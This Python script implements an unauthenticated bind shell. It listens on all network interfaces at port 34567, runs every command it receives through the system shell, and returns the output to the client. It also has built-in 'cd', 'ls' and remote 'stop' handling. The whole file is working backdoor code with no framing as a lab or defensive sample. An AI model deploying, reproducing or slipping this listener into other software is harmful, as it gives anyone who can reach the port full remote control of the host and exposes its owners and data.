import socket
import threading
import subprocess
import traceback
import sys
import os

stop_event = threading.Event()
current_dir = os.getcwd()
lock = threading.Lock()

def human_readable_size(size):
    for unit in ['B','KB','MB','GB','TB']:
        if size < 1024.0:
            return f"{size:.2f} {unit}"
        size /= 1024.0
    return f"{size:.2f} PB"

def custom_ls():
    items = os.listdir(current_dir)
    folders = []
    files = []
    for item in items:
        full_path = os.path.join(current_dir, item)
        if os.path.isdir(full_path):
            folders.append(item)
        else:
            files.append(item)
    folders.sort()
    files.sort()
    output = []
    for folder in folders:
        path = os.path.join(current_dir, folder)
        size = sum(os.path.getsize(os.path.join(dirpath, f))
                   for dirpath, _, filenames in os.walk(path)
                   for f in filenames)
        output.append(f"{folder:<10} | Folder - {human_readable_size(size)} - {path}")
    for file in files:
        path = os.path.join(current_dir, file)
        size = os.path.getsize(path)
        output.append(f"{file:<10} | File   - {human_readable_size(size)} - {path}")
    return "\n".join(output)

def handle_client(client):
    global current_dir
    try:
        while True:
            data = client.recv(1024)
            if not data:
                break
            cmd = data.decode().strip()
            if cmd == 'stop':
                client.sendall(b"Server stopping...\n")
                stop_event.set()
                break
            result = ""
            try:
                if cmd.startswith('cd'):
                    parts = cmd.split(maxsplit=1)
                    if len(parts) == 2:
                        path = parts[1]
                        new_dir = os.path.abspath(os.path.join(current_dir, path))
                        if os.path.isdir(new_dir):
                            with lock:
                                current_dir = new_dir
                            result = f"Changed directory to {current_dir}"
                        else:
                            result = f"No such directory: {new_dir}"
                    else:
                        result = current_dir
                elif cmd in ('ls', 'dir'):
                    result = custom_ls()
                else:
                    proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, cwd=current_dir)
                    out, err = proc.communicate()
                    if proc.returncode != 0:
                        result = f"Command not found or failed:\n{err.decode()}"
                    else:
                        result = out.decode(errors='ignore') if out else "(no output)"
            except Exception:
                result = f"Error executing command:\n{traceback.format_exc()}"
            client.sendall(result.encode())
    except Exception:
        try:
            client.sendall(b"Server error.\n")
        except:
            pass
    finally:
        client.close()

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 34567))
    sock.listen(5)
    sock.settimeout(1.0)

    while not stop_event.is_set():
        try:
            client, addr = sock.accept()
            threading.Thread(target=handle_client, args=(client,), daemon=True).start()
        except socket.timeout:
            continue
        except Exception:
            continue

    sock.close()
    sys.exit(0)

if __name__ == "__main__":
    main()
